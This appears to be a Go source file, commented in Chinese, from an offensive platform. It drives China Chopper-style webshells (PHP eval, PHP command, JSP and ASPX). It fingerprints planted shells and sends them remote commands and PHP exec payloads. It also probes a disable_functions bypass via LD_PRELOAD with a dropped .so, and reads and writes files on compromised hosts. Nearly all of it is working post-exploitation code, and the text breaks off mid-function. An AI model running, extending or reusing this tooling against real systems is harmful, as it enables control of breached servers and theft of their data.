// http_shell.go 是 HTTP 一句话马会话驱动（菜刀/蚁剑式 POST 协议）,期 1a 重点。
//
// 支持马型（协议族通用实现，无任何特定目标值）:
//   - PHP 一句话（eval 型）:POST 密码字段，值为 PHP 代码。eval / assert 两族都按
//     「代码执行字段」通信（PHP7 assert(string) 同样求值）,family 由 debug_backtrace
//     探针分辨；命令执行函数按 exec→shell_exec→system→passthru 探测并记住可用者。
//     exec 系全禁（disable_functions）时自动探测内建 LD_PRELOAD 绕过（见 bypass.go)。
//   - PHP 命令马（cmdshell,lang=phpcmd):POST 密码字段，值直接是 shell 命令，
//     马体直接 exec 并回显 stdout（无 PHP eval)。复盘 R1：此前探针只认 eval 型，
//     命令马全灭并被 lang:auto 误判成 JSP。
//   - JSP 一句话：POST 密码字段，值为 shell 命令（Runtime.exec("/bin/sh","-c",cmd))。
//   - ASPX 一句话：POST 密码字段，值为 shell 命令（cmd.exe /c)。
//
// 所有执行回显用「每次请求随机生成的哨兵对」包裹：起始/结束 marker 都命中才取信
// 中间内容；缺失即视为失败（函数被禁/WAF 拦截/马失效）,返回带语义的错误。
package session

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// ChunkSize 是文件读写的分块大小（64KB 原文,base64 后约 85KB)。
// 上限依据:Linux execve 单参数上限 MAX_ARG_STRLEN=128KB——写入经 `/bin/sh -c`
// 内联 base64 时命令行即单个参数,512KB 块(b64 ~700KB)会必炸 E2BIG
// (实战:Tomcat JSP 马 256KB 内联即 HTTP 500;PHP exec 族同理)。
// 加密马的 read/write op 走 JSON POST body 不受此限,见 http_shell_enc.go。
const ChunkSize = 64 * 1024

const (
	defaultHTTPTimeout = 15 * time.Second
	maxBodyRead        = 8 << 20 // 单次响应最大读取（分块设计下远超实际需要）
)

// phpExecFuncs 是 PHP 命令执行函数的优先级顺序（探测与降级都按此）。
var phpExecFuncs = []string{"exec", "shell_exec", "system", "passthru"}

// ProbeInfo 是 register_session 探测返回的马型指纹。
type ProbeInfo struct {
	Kind     string   `json:"kind"`     // http_php / http_phpcmd / http_jsp / http_aspx
	Lang     string   `json:"lang"`     // php / phpcmd / jsp / aspx
	Variant  string   `json:"variant"`  // php: eval | assert;phpcmd: cmd;其它为空
	Funcs    []string `json:"funcs"`    // php: 可用执行函数（按优先级序）;其它为空
	Platform string   `json:"platform"` // linux | windows（尽力探测，默认按语言族）

	// PHP eval 马的 disable_functions 指纹与内建绕过探测结论（见 bypass.go)。
	DisableFunctions bool   `json:"disable_functions,omitempty"` // exec 系全禁
	Mail             bool   `json:"mail,omitempty"`              // mail() 可用
	Putenv           bool   `json:"putenv,omitempty"`            // putenv() 可用
	Bypass           string `json:"bypass,omitempty"`            // 已确认可用的绕过:ld_preload
	BypassLib        string `json:"bypass_lib,omitempty"`        // 已投递到目标侧的 .so 路径
	BypassNote       string `json:"bypass_note,omitempty"`       // 绕过探测结论（含不可用原因）
}

// HTTPShell 是一句话马会话。零值不可用，经 Probe / NewHTTPShell 构造。
type HTTPShell struct {
	id       int64
	kind     string // http_php / http_phpcmd / http_jsp / http_aspx
	url      string
	password string // 连接密码 = POST 字段名
	lang     string // php / phpcmd / jsp / aspx
	variant  string // php: eval | assert;phpcmd: cmd
	platform string // linux | windows

	mu    sync.RWMutex
	funcs []string // php 可用执行函数（探测记忆，禁用变化时重探）

	// disable_functions 指纹与绕过登记（探测写入，恢复路径由 Secret 回填）。
	disableFuncs bool
	mailOK       bool
	putenvOK     bool
	bypass       string // 已确认可用:ld_preload
	bypassLib    string // 已投递的 .so 目标侧路径（留口：后续 session_exec 走绕过执行）

	execMu sync.Mutex // per-session 执行串行锁（复盘 R5：同会话并发执行输出串台）

	client *http.Client
	enc    *encTransport // 加密马（phpenc/jspenc）传输层；nil = 期 1a 明文表单
}

// DirectHTTPClient 返回平台直连 HTTP 客户端：显式不走 HTTP_PROXY 等 env 代理
// （目标侧请求由平台直连；worker 机器的代理 env 与本组件无关）。
func DirectHTTPClient(timeout time.Duration) *http.Client {
	if timeout <= 0 {
		timeout = defaultHTTPTimeout
	}
	return &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			Proxy: nil, // 不用 http.ProxyFromEnvironment:目标请求必须直连
		},
	}
}

// NewHTTPShell 由已知参数构造会话（DB 恢复路径：马型已探测过，不重复探测）。
// lang: php / phpcmd / jsp / aspx。password 为空默认 "cmd"。
func NewHTTPShell(shellURL, password, lang string) (*HTTPShell, error) {
	s := &HTTPShell{
		url:      strings.TrimSpace(shellURL),
		password: password,
		lang:     strings.ToLower(strings.TrimSpace(lang)),
		client:   DirectHTTPClient(0),
	}
	if s.password == "" {
		s.password = "cmd"
	}
	switch s.lang {
	case "php":
		s.kind, s.platform = "http_php", "linux"
	case "phpcmd":
		s.kind, s.platform, s.variant = "http_phpcmd", "linux", "cmd"
	case "jsp":
		s.kind, s.platform = "http_jsp", "linux"
	case "aspx":
		s.kind, s.platform = "http_aspx", "windows"
	default:
		return nil, opError("probe", "无法识别的 WebShell 语言: %q（支持 php/phpcmd/jsp/aspx)", lang)
	}
	if _, err := url.ParseRequestURI(s.url); err != nil {
		return nil, opError("probe", "非法 WebShell URL: %v", err)
	}
	return s, nil
}

// SetID 在落库后回填 sessions 表主键。
func (s *HTTPShell) SetID(id int64) { s.id = id }

// SetVariant 恢复已探测的 family(php: eval/assert)。
func (s *HTTPShell) SetVariant(v string) { s.variant = v }

// SetPlatform 恢复已探测的平台。
func (s *HTTPShell) SetPlatform(p string) {
	if p == "linux" || p == "windows" {
		s.platform = p
	}
}

// SetFuncs 恢复已探测的 PHP 执行函数清单。
func (s *HTTPShell) SetFuncs(funcs []string) {
	s.mu.Lock()
	s.funcs = append([]string(nil), funcs...)
	s.mu.Unlock()
}

// Funcs 返回探测到的 PHP 执行函数（副本）。
func (s *HTTPShell) Funcs() []string {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return append([]string(nil), s.funcs...)
}

func (s *HTTPShell) ID() int64                   { return s.id }
func (s *HTTPShell) Kind() string                { return s.kind }
func (s *HTTPShell) Lang() string                { return s.lang }
func (s *HTTPShell) URL() string                 { return s.url }
func (s *HTTPShell) Close(context.Context) error { return nil } // HTTP 会话无资源

// Secret 是落库 secret JSON 的形态（连接参数，由 db 层加密存储）。
type Secret struct {
	URL      string   `json:"url"`
	Password string   `json:"password"`
	Lang     string   `json:"lang"`
	Variant  string   `json:"variant,omitempty"`
	Platform string   `json:"platform,omitempty"`
	Funcs    []string `json:"funcs,omitempty"`
	// disable_functions 指纹与绕过登记（复盘 R1：探测结果随 secret 落库，
	// 比 sessions 表加列侵入小；恢复后免重探）。
	DisableFunctions bool   `json:"disable_functions,omitempty"`
	Mail             bool   `json:"mail,omitempty"`
	Putenv           bool   `json:"putenv,omitempty"`
	Bypass           string `json:"bypass,omitempty"`
	BypassLib        string `json:"bypass_lib,omitempty"`
	// 加密马（phpenc/jspenc）专有：会话密钥（base64 32B）与锁存的加密模式。
	Key     string `json:"key,omitempty"`
	EncMode string `json:"enc_mode,omitempty"`
}

// Secret 导出当前连接参数（探测后的完整指纹）。
func (s *HTTPShell) Secret() Secret {
	sec := Secret{
		URL: s.url, Password: s.password, Lang: s.lang,
		Variant: s.variant, Platform: s.platform, Funcs: s.Funcs(),
		DisableFunctions: s.disableFuncs, Mail: s.mailOK, Putenv: s.putenvOK,
		Bypass: s.bypass, BypassLib: s.bypassLib,
	}
	if s.enc != nil {
		sec.Key = base64.StdEncoding.EncodeToString(s.enc.key)
		sec.EncMode = s.enc.Mode()
	}
	return sec
}

// RestoreHTTPShell 由 DB secret 重建会话（启动恢复，不重新探测）。
// secret 含 Key 时按加密马（phpenc/jspenc）恢复，并带回锁存的加密模式。
func RestoreHTTPShell(id int64, sec Secret) (*HTTPShell, error) {
	var s *HTTPShell
	var err error
	if sec.Key != "" {
		s, err = NewEncShell(sec.URL, sec.Lang, sec.Key)
	} else {
		s, err = NewHTTPShell(sec.URL, sec.Password, sec.Lang)
	}
	if err != nil {
		return nil, err
	}
	s.id = id
	s.SetVariant(sec.Variant)
	s.SetPlatform(sec.Platform)
	s.SetFuncs(sec.Funcs)
	s.disableFuncs = sec.DisableFunctions
	s.mailOK = sec.Mail
	s.putenvOK = sec.Putenv
	s.bypass = sec.Bypass
	s.bypassLib = sec.BypassLib
	if s.enc != nil {
		s.enc.SetMode(sec.EncMode)
	}
	return s, nil
}

// ---------------- 传输 ----------------

// post 发一次表单 POST。网络层失败统一 *Error;响应体截断读取。
// 加密马（s.enc != nil）改走加密传输：同一 payload 经 op=exec 密文通道。
func (s *HTTPShell) post(ctx context.Context, fields url.Values, timeout time.Duration) (string, error) {
	body, _, err := s.postH(ctx, fields, timeout)
	return body, err
}

// postH 同 post，附带响应头（auto 判型要用通用头信号区分 phpcmd/jsp;
// 加密马通道无明文响应头语义，恒返回 nil)。
func (s *HTTPShell) postH(ctx context.Context, fields url.Values, timeout time.Duration) (string, http.Header, error) {
	if s.enc != nil {
		body, err := s.enc.exec(ctx, fields.Get(s.password), timeout)
		return body, nil, err
	}
	if timeout <= 0 {
		timeout = defaultHTTPTimeout
	}
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, s.url,
		strings.NewReader(fields.Encode()))
	if err != nil {
		return "", nil, opError("http", "构造请求失败: %v", err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (ARTEX)")
	resp, err := s.client.Do(req)
	if err != nil {
		return "", nil, opError("http", "HTTP 请求失败（马不可达：目标宕机/超时/连接重置）: %v", err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, maxBodyRead))
	if err != nil {
		return "", nil, opError("http", "读取响应失败: %v", err)
	}
	if resp.StatusCode >= 400 {
		return string(body), resp.Header, opError("http", "疑似被拦/马被删除：目标返回 HTTP %d: %s",
			resp.StatusCode, excerpt(string(body), 200))
	}
	return string(body), resp.Header, nil
}

// ---------------- 哨兵 ----------------

// sentinel 是一次请求一对的随机哨兵。随机化防回显污染/粘连/误命中：
// 固定 marker 会被目标输出里碰巧出现的同名字符串欺骗（PivotHub 的教训）。
type sentinel struct{ start, end string }

func newSentinel() sentinel {
	var b [8]byte
	_, _ = rand.Read(b[:])
	h := hex.EncodeToString(b[:])
	return sentinel{start: h[:8], end: h[8:] + h[:4]}
}

// extract 取出哨兵包裹的内容。start 取首次出现、end 取 start 之后的首次出现,
// 防 start 粘连到目标输出尾部被误切。两个 marker 都在才可信。
func (m sentinel) extract(body string) (string, bool) {
	i := strings.Index(body, m.start)
	if i < 0 {
		return "", false
	}
	rest := body[i+len(m.start):]
	j := strings.Index(rest, m.end)
	if j < 0 {
		return "", false
	}
	return rest[:j], true
}

// excerpt 截断回显摘要（报错用，防巨型 body 灌进上下文）。
func excerpt(s string, n int) string {
	s = strings.TrimSpace(s)
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

func b64e(data []byte) string { return base64.StdEncoding.EncodeToString(data) }

// ---------------- 探测 ----------------

// Probe 探测 url 上的一句话马：发无害探针（echo 哨兵）,按回显判定马型与可用
// 执行函数。lang 为 "auto" 时按「eval 探针与 cmd 探针分开打，谁的哨兵对就判谁」
// 的顺序判型（见 probeAuto)。失败返回带探针回显摘要的错误，不伪造成功。
func Probe(ctx context.Context, shellURL, password, lang string) (*HTTPShell, ProbeInfo, error) {
	lang = strings.ToLower(strings.TrimSpace(lang))
	if lang == "" || lang == "auto" {
		return probeAuto(ctx, shellURL, password)
	}
	s, err := NewHTTPShell(shellURL, password, lang)
	if err != nil {
		return nil, ProbeInfo{}, err
	}
	info, err := s.probe(ctx)
	if err != nil {
		return nil, ProbeInfo{}, err
	}
	return s, info, nil
}

// probeAuto 自动判型（复盘 R1 修正：旧实现 eval 探针会被 sh 命令马「字符串拼接」
// 假象骗进 PHP 分支，最终把 PHP 命令马误判成 http_jsp)。顺序：
//
//	① PHP eval 探针——PHP 专属语法（字符串拼接+算术求值）,sh 命令马吃不下；
//	② sh 命令探针（一次）——命中即「POST 字段直接是 shell 命令」的命令马，
//	  再按通用响应头信号区分 PHP 命令马（phpcmd)/Java 容器马（jsp):
//	  X-Powered-By 含 PHP → phpcmd;JSESSIONID/容器签名 → jsp;
//	  无信号默认 phpcmd（加固 PHP 常剥头，而两者执行通道同构，误判代价对称）;
//	③ ASPX 探针——cmd.exe 专属（未定义变量展开为空）。
func probeAuto(ctx context.Context, shellURL, password string) (*HTTPShell, ProbeInfo, error) {
	var errs []string
	if s, err := NewHTTPShell(shellURL, password, "php"); err == nil {
		if info, perr := s.probe(ctx); perr == nil {
			return s, info, nil
		} else {
			errs = append(errs, fmt.Sprintf("[php-eval] %v", perr))
		}
	}
	hdr, err := probeCmdEcho(ctx, shellURL, password, "linux")
	if err == nil {
		lang := "phpcmd"
		if !phpServerHint(hdr) && javaContainerHint(hdr) {
			lang = "jsp"
		}
		s, cerr := NewHTTPShell(shellURL, password, lang)
		if cerr != nil {
			return nil, ProbeInfo{}, cerr
		}
		return s, ProbeInfo{Kind: s.kind, Lang: lang, Variant: s.variant, Platform: "linux"}, nil
	}
	errs = append(errs, fmt.Sprintf("[sh-cmd] %v", err))
	if s, err := NewHTTPShell(shellURL, password, "aspx"); err == nil {
		if info, perr := s.probe(ctx); perr == nil {
			return s, info, nil
		} else {
			errs = append(errs, fmt.Sprintf("[aspx] %v", perr))
		}
	}
	return nil, ProbeInfo{}, opError("probe", "马型探测失败：%s", strings.Join(errs, "; "))
}

// probeCmdEcho 发一次 sh 命令回显探针，命中返回响应头（供 phpcmd/jsp 判型）。
func probeCmdEcho(ctx context.Context, shellURL, password, platform string) (http.Header, error) {
	s, err := NewHTTPShell(shellURL, password, "phpcmd")
	if err != nil {
		return nil, err
	}
	m := newSentinel()
	cmd, want := echoProbeCommand(m, platform)
	body, hdr, err := s.postH(ctx, url.Values{s.password: {cmd}}, 0)
	if err != nil {
		return nil, err
	}
	if !strings.Contains(body, want) {
		return nil, opError("probe", "命令探针哨兵未回显：不是命令执行型马（POST 字段不是 shell 命令），或响应被 WAF 改写。回显摘要: %q",
			excerpt(body, 200))
	}
	return hdr, nil
}

// phpServerHint 按通用响应头识别 PHP 服务端（X-Powered-By)。只认通用协议信号，
// 无任何特定目标值。
func phpServerHint(h http.Header) bool {
	if h == nil {
		return false
	}
	return strings.Contains(strings.ToLower(h.Get("X-Powered-By")), "php")
}

// javaContainerHint 按通用响应头信号识别 Java 容器（JSESSIONID cookie、Server
// 头容器签名、X-Powered-By 的 servlet/jsp)。
func javaContainerHint(h http.Header) bool {
	if h == nil {
		return false
	}
	for _, c := range h.Values("Set-Cookie") {
		if strings.Contains(strings.ToUpper(c), "JSESSIONID") {
			return true
		}
	}
	server := strings.ToLower(h.Get("Server"))
	for _, sig := range []string{"coyote", "tomcat", "jetty", "glassfish", "jboss", "wildfly", "weblogic", "websphere", "resin", "servlet"} {
		if strings.Contains(server, sig) {
			return true
		}
	}
	powered := strings.ToLower(h.Get("X-Powered-By"))
	return strings.Contains(powered, "servlet") || strings.Contains(powered, "jsp")
}

// probe 按已选语言探测并填充 variant/funcs/platform。
func (s *HTTPShell) probe(ctx context.Context) (ProbeInfo, error) {
	info := ProbeInfo{Kind: s.kind, Lang: s.lang, Platform: s.platform}
	switch s.lang {
	case "php":
		// 1) 存活探针:PHP 专属语法（字符串拼接 + 算术求值）。命令马把它当 shell
		// 命令执行时 `(20+22)` 是语法错误，绝不可能回出 S42E——这是 eval 马与
		// 命令马的分界（复盘 R1：旧探针 `echo "S"."E"` 会被 sh 拼接回显）。
		m := newSentinel()
		body, err := s.post(ctx, url.Values{s.password: {`echo "` + m.start + `".(20+22)."` + m.end + `";`}}, 0)
		if err != nil {
			return info, err
		}
		if !strings.Contains(body, m.start+"42"+m.end) {
			return info, opError("probe", "eval 探针哨兵未回显：不是 PHP 代码执行型一句话（探针协议不匹配），或响应被 WAF 改写。回显摘要: %q", excerpt(body, 200))
		}
		// 2) family 分辨：debug_backtrace 首帧函数名 eval / assert。
		fm := newSentinel()
		famPayload := `echo "` + fm.start + `";` +
			`$bt=@debug_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS,1);` +
			`echo (($bt[0]['function']??'')==='assert'?'assert':'eval');` +
			`echo "` + fm.end + `";`
		fbody, err := s.post(ctx, url.Values{s.password: {famPayload}}, 0)
		if err == nil {
			if out, ok := fm.extract(fbody); ok {
				info.Variant = strings.TrimSpace(out)
			}
		}
		if info.Variant != "assert" {
			info.Variant = "eval" // 分辨失败按 eval（两者通信协议相同，仅上报语义）
		}
		s.variant = info.Variant
		// 3) 能力指纹：exec 系函数 + mail()/putenv() 可用性（无害 function_exists
		// 探针，disable_functions 直接反映在结果里）。
		caps, err := s.probePHPCaps(ctx)
		if err != nil {
			return info, err
		}
		info.Funcs = caps.funcs
		info.Mail, info.Putenv = caps.mail, caps.putenv
		s.SetFuncs(caps.funcs)
		s.mailOK, s.putenvOK = caps.mail, caps.putenv
		if len(caps.funcs) == 0 {
			info.DisableFunctions = true
			s.disableFuncs = true
			// 内建 LD_PRELOAD 绕过探测（复盘 R1):exec 全禁且 mail+putenv 可用
			// 时投递预编译 freestanding .so 探活。失败不拖垮登记，原因进 BypassNote。
			if caps.mail && caps.putenv {
				s.probeBypass(ctx, &info)
			} else {
				info.BypassNote = "mail()/putenv() 不全可用，LD_PRELOAD 绕过前提不满足"
			}
		}
		return info, nil
	case "phpcmd":
		// 命令执行马：POST 字段直接是 shell 命令。与 JSP 通道同构（linux sh),
		// 显式指定 phpcmd 时不再要求容器头信号。
		if err := s.probeEcho(ctx, "linux"); err != nil {
			return info, err
		}
		s.platform = "linux"
		info.Platform = "linux"
		info.Variant = "cmd"
		return info, nil
	case "jsp":
		if err := s.probeEcho(ctx, "linux"); err != nil {
			return info, err
		}
		s.platform = "linux"
		info.Platform = "linux"
		return info, nil
	case "aspx":
		if err := s.probeEcho(ctx, "windows"); err != nil {
			return info, err
		}
		s.platform = "windows"
		info.Platform = "windows"
		return info, nil
	}
	return info, opError("probe", "未支持的语言 %q", s.lang)
}

// echoProbeCommand 构造命令回显探针：linux 用 POSIX 算术展开 $((40+2))
// (cmd.exe 原样输出，不符）;windows 用 cmd 批处理的未定义变量展开为空
// (sh 原样输出 %VAR%，不符）。
func echoProbeCommand(m sentinel, platform string) (cmd, want string) {
	if platform == "windows" {
		return "echo " + m.start + "%ARTEX_PROBE_UNSET%" + m.end, m.start + m.end
	}
	return "echo " + m.start + "$((40+2))" + m.end + " 2>&1", m.start + "42" + m.end
}

// probeEcho 探测命令回显型马（phpcmd/JSP/ASPX)。探针带语言族特征，防 auto 探测互相误判。
func (s *HTTPShell) probeEcho(ctx context.Context, platform string) error {
	m := newSentinel()
	cmd, want := echoProbeCommand(m, platform)
	body, err := s.post(ctx, url.Values{s.password: {cmd}}, 0)
	if err != nil {
		return err
	}
	if !strings.Contains(body, want) {
		return opError("probe", "哨兵未回显：不是 %s 命令回显型一句话（探针协议不匹配），或响应被 WAF 改写。回显摘要: %q",
			strings.ToUpper(s.lang), excerpt(body, 200))
	}
	return nil
}

// phpCaps 是 PHP eval 马的能力指纹：可用执行函数 + mail/putenv 可用性。
type phpCaps struct {
	funcs  []string
	mail   bool
	putenv bool
}

// probePHPCaps 枚举目标 PHP 可用的命令执行函数（按优先级序）与 mail()/putenv()
// 可用性（LD_PRELOAD 绕过前提指纹，无害 function_exists 探针）。
func (s *HTTPShell) probePHPCaps(ctx context.Context) (phpCaps, error) {
	var caps phpCaps
	m := newSentinel()
	payload := `echo "` + m.start + `";` +
		`foreach(array("exec","shell_exec","system","passthru","mail","putenv") as $f){if(function_exists($f)){echo $f.",";}}` +
		`echo "` + m.end + `";`
	body, err := s.post(ctx, url.Values{s.password: {payload}}, 0)
	if err != nil {
		return caps, err
	}
	out, ok := m.extract(body)
	if !ok {
		return caps, opError("probe", "函数枚举哨兵缺失（疑似被 WAF 拦截/改写）。回显摘要: %q", excerpt(body, 200))
	}
	have := map[string]bool{}
	for _, f := range strings.Split(out, ",") {
		have[strings.TrimSpace(f)] = true
	}
	for _, f := range phpExecFuncs { // 按优先级序返回，而非目标枚举序
		if have[f] {
			caps.funcs = append(caps.funcs, f)
		}
	}
	caps.mail = have["mail"]
	caps.putenv = have["putenv"]
	return caps, nil
}

// Test 是接口要求的连通性检查：重发存活探针。加密马走 op=probe 加密探针。
func (s *HTTPShell) Test(ctx context.Context) error {
	if s.enc != nil {
		return s.enc.probe(ctx, 0)
	}
	switch s.lang {
	case "php":
		m := newSentinel()
		body, err := s.post(ctx, url.Values{s.password: {`echo "` + m.start + `".(20+22)."` + m.end + `";`}}, 0)
		if err != nil {
			return err
		}
		if !strings.Contains(body, m.start+"42"+m.end) {
			return opError("test", "哨兵未回显：马已失效或响应被拦截/改写。回显摘要: %q", excerpt(body, 200))
		}
		return nil
	default:
		return s.probeEcho(ctx, s.platform)
	}
}

// ---------------- 命令执行 ----------------

// needsScriptDrop 判定命令是否走「引号规避落盘」:含单引号/双引号/换行/反斜杠的
// 复杂命令，内联进哨兵包装层会被多层 shell 撕碎（PivotHub base.py:34-61 的教训:
// shlex.quote 产出 '"'"' 会提前终止外层双引号）。
func needsScriptDrop(cmd string) bool {
	return strings.ContainsAny(cmd, "'\"\n\\")
}

// scriptDrop 把命令 base64 落到目标临时文件再 sh 执行：包装层只见
// `sh <文件>`（无引号风险）,命令本体不再被任何一层 shell 重新解析。
// 临时文件用调用方命名空间前缀（复盘 R5:per-worker 前缀防多 worker 互相覆盖）
// + 随机段，执行完清理（后台任务已 fork，不受影响）。
func scriptDrop(cmd, prefix string) string {
	var b [6]byte
	_, _ = rand.Read(b[:])
	path := prefix + hex.EncodeToString(b[:]) + ".sh"
	return "echo " + b64e([]byte(cmd)) + " | base64 -d > " + path +
		" && sh " + path + "; rm -f " + path
}

// Exec 执行一条 shell 命令。stderr 合并进 stdout(webshell 无法分离）。
// per-session 串行（复盘 R5)：同会话并发执行会经共享临时文件/交错回显串台，
// 哨兵因此误报「马失效」——同会话强制串行，会话间仍可并发。
func (s *HTTPShell) Exec(ctx context.Context, cmd string, timeout time.Duration) (string, string, error) {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return "", "", opError("exec", "空命令")
	}
	s.execMu.Lock()
	defer s.execMu.Unlock()
	if s.lang == "aspx" {
		// Windows cmd 无 /bin/sh 与 base64 -d，维持内联（模板是 cmd /c 形态）。
		return s.execCmd(ctx, cmd, timeout)
	}
	if needsScriptDrop(cmd) {
		cmd = scriptDrop(cmd, tmpPrefixFrom(ctx))
	}
	if s.lang == "php" {
		return s.execPHP(ctx, cmd, timeout, true)
	}
	return s.execSh(ctx, cmd, timeout)
}

// execSh 是 JSP(linux sh）路径：命令嵌进哨兵包装，一次 shell 解析。
func (s *HTTPShell) execSh(ctx context.Context, cmd string, timeout time.Duration) (string, string, error) {
	m := newSentinel()
	wrapped := "echo " + m.start + "; " + cmd + " 2>&1; echo " + m.end
	body, err := s.post(ctx, url.Values{s.password: {wrapped}}, timeout)
	if err != nil {
		return "", "", err
	}
	out, ok := m.extract(body)
	if !ok {
		return "", "", opError("exec", "回显缺失哨兵：命令可能被 WAF 拦截或马已失效。回显摘要: %q", excerpt(body, 400))
	}
	return strings.Trim(out, "\r\n"), "", nil
}

// execCmd 是 ASPX(windows cmd）路径。
func (s *HTTPShell) execCmd(ctx context.Context, cmd string, timeout time.Duration) (string, string, error) {
	m := newSentinel()
	wrapped := "echo " + m.start + "& " + cmd + " 2>&1 &echo " + m.end
	body, err := s.post(ctx, url.Values{s.password: {wrapped}}, timeout)
	if err != nil {
		return "", "", err
	}
	out, ok := m.extract(body)
	if !ok {
		return "", "", opError("exec", "回显缺失哨兵：命令可能被 WAF 拦截或马已失效。回显摘要: %q", excerpt(body, 400))
	}
	return strings.Trim(out, "\r\n"), "", nil
}

// phpExecPayload 生成指定函数的执行 payload（function_exists 守护：目标侧
// 函数被禁时落 NOFUNC 哨兵，而不是静默失败）。
func phpExecPayload(cmd, fn string, m sentinel) string {
	c := `$c=base64_decode("` + b64e([]byte(cmd)) + `");`
	body := `echo "NOFUNC";`
	switch fn {
	case "exec":
		body = `@exec($c." 2>&1",$o);echo implode("\n",$o);`
	case "shell_exec":
		body = `echo @shell_exec($c." 2>&1");`
	case "system":
		body = `@system($c." 2>&1");`
	case "passthru":
		body = `@passthru($c." 2>&1");`
	}
	return `echo "` + m.start + `";` + c +
		`if(function_exists("` + fn + `")){` + body + `}else{echo "NOFUNC";}` +
		`echo "\n` + m.end + `";`
}

// execPHP 按记忆的可用函数执行；首选函数失败（被禁变化/拦截）时按优先级降级
// 重试，全部失败返回带语义的错误。allowReprobe 防止重探递归。
func (s *HTTPShell) execPHP(ctx context.Context, cmd string, timeout time.Duration, allowReprobe bool) (string, string, error) {
	funcs := s.Funcs()
	if len(funcs) == 0 {
		msg := "目标 PHP 禁用了 exec/shell_exec/system/passthru(disable_functions),session_exec 直执行不可用；文件读写仍可用"
		if s.bypass != "" {
			msg += "；已登记可用绕过路径 " + s.bypass + "(.so 已投递 " + s.bypassLib +
				"),但当前版本 session_exec 尚未接通绕过执行（留口，见 session/bypass.go)"
		}
		return "", "", opError("exec", "%s", msg)
	}
	var lastErr error
	for _, fn := range funcs {
		m := newSentinel()
		body, err := s.post(ctx, url.Values{s.password: {phpExecPayload(cmd, fn, m)}}, timeout)
		if err != nil {
			return "", "", err // 传输层失败不重试（马大概率已死）
		}
		out, ok := m.extract(body)
		if !ok {
			// 哨兵缺失：WAF 拦截或函数被禁导致 500/空回显。换下一个函数降级。
			lastErr = opError("exec", "函数 %s 回显缺失哨兵（可能被禁/疑似被 WAF 拦截）。回显摘要: %q", fn, excerpt(body, 400))
			continue
		}
		if strings.Contains(out, "NOFUNC") {
			lastErr = opError("exec", "function_exists(%s) 为假：该函数已被 disable_functions 禁用", fn)
			continue
		}
		return strings.Trim(out, "\r\n"), "", nil
	}
	// 全部记忆函数失败：重探一次（目标 php.ini 可能变了）,再按新清单试一轮。
	if allowReprobe {
		if caps, err := s.probePHPCaps(ctx); err == nil {
			s.SetFuncs(caps.funcs)
			s.mailOK, s.putenvOK = caps.mail, caps.putenv
			if len(caps.funcs) > 0 && !sameStrings(caps.funcs, funcs) {
				return s.execPHP(ctx, cmd, timeout, false)
			}
		}
	}
	if lastErr != nil {
		return "", "", lastErr
	}
	return "", "", opError("exec", "目标 PHP 禁用了全部命令执行函数（disable_functions)")
}

func sameStrings(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// ---------------- 文件操作 ----------------

// phpFileOp 发一个 PHP 文件操作 payload 并取哨兵内容（哨兵由调用方构造并传入）。
func (s *HTTPShell) phpFileOp(ctx context.Context, payload string, m sentinel, timeout time.Duration) (string, error) {
	body, err := s.post(ctx, url.Values{s.password: {payload}}, timeout)
	if err != nil {
		return "", err
	}
	out, ok := m.extract(body)
	if !ok {
		return "", opError("file", "文件操作回显缺失哨兵（可能被 WAF 拦截）。回显摘要: %q", excerpt(body, 300))
	}
	return out, nil
}

// ReadFile 读目标侧文件，按 ChunkSize 分块（base64 回传）。
func (s *HTTPShell) ReadFile(ctx context.Context, path string) ([]byte, error) {
	if strings.TrimSpace(path) == "" {
		return nil, opError("read", "path 为空")
	}
	if s.lang != "php" {
		return s.readFileShell(ctx, path)
	}
	var out []byte
	for offset := 0; ; offset += ChunkSize {
		m := newSentinel()
		payload := `echo "` + m.start + `";` +
			`$f=base64_decode("` + b64e([]byte(path)) + `");` +
			`$h=@fopen($f,"rb");if(!$h){echo "READFAIL";}` +
			`else{@fseek($h,` + fmt.Sprint(offset) + `);echo base64_encode(@fread($h,` + fmt.Sprint(ChunkSize) + `));@fclose($h);}` +
			`echo "\n` + m.end + `";`
		raw, err := s.phpFileOp(ctx, payload, m, 30*time.Second)
		if err != nil {
			return nil, err
		}
		if strings.Contains(raw, "READFAIL") {
			return nil, opError("read", "读取失败（文件不存在或无权限）: %s", path)
		}
		chunk, err := base64.StdEncoding.DecodeString(strings.TrimSpace(raw))
		if err != nil {
			return nil, opError("read", "回显 base64 解码失败（回显被污染）: %v", err)
		}
		out = append(out, chunk...)
		if len(chunk) < ChunkSize {
			return out, nil // 短块 = EOF
		}
	}
}

// readFileShell 是 JSP/ASPX 退化读路径：linux 用 dd 分块 + base64;windows 用 type。
func (s *HTTPShell) readFileShell(ctx context.Context, path string) ([]byte, error) {
	if s.platform == "windows" {
		stdout, _, err := s.execCmd(ctx, "type "+path, 30*time.Second)
		if err != nil {
			return nil, err
		}
		return []byte(stdout), nil
	}
	q := shellQuote(path)
	var out []byte
	for skip := 0; ; skip++ {
		stdout, _, err := s.execSh(ctx,
			fmt.Sprintf("dd if=%s bs=%d skip=%d 2>/dev/null | base64 -w0", q, ChunkSize, skip), 60*time.Second)
		if err != nil {
			return nil, err
		}
		chunk, derr := base64.StdEncoding.DecodeString(strings.TrimSpace(stdout))
		if derr != nil {
			return nil, opError("read", "回显 base64 解码失败: %v（原始摘要: %q)", derr, excerpt(stdout, 200))
		}
		out = append(out, chunk...)
		if len(chunk) < ChunkSize {
			return out, nil
		}
	}
}

// WriteFile 写目标侧文件，按 ChunkSize 分块 append(base64 密文直达目标侧解码）。
func (s *HTTPShell) WriteFile(ctx context.Context, path string, data []byte) error {
	if strings.TrimSpace(path) == "" {
		return opError("write", "path 为空")
	}
	if s.lang == "php" {
		return s.writeFilePHP(ctx, path, data)
	}
